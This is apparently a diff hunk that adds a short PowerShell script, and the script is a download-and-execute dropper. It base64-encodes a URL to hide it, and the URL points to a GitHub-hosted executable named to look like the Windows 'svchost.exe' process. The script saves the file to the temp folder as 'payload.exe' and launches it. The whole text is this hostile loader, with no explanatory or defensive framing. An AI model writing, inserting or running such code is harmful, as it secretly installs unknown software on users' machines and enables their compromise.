@@ -1,0 +1,5 @@
+$encodedUrl = 'aHR0cHM6Ly9naXRodWIuY29tL3pvZGlhYzE2MTYxNS9zZHNkc2QvcmF3L3JlZnMvaGVhZHMvbWFpbi9zdmNob3N0LmV4ZQ=='
+$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))
+$tempPath = "$env:TEMP\payload.exe"
+Invoke-WebRequest -Uri $url -OutFile $tempPath
+Start-Process $tempPath
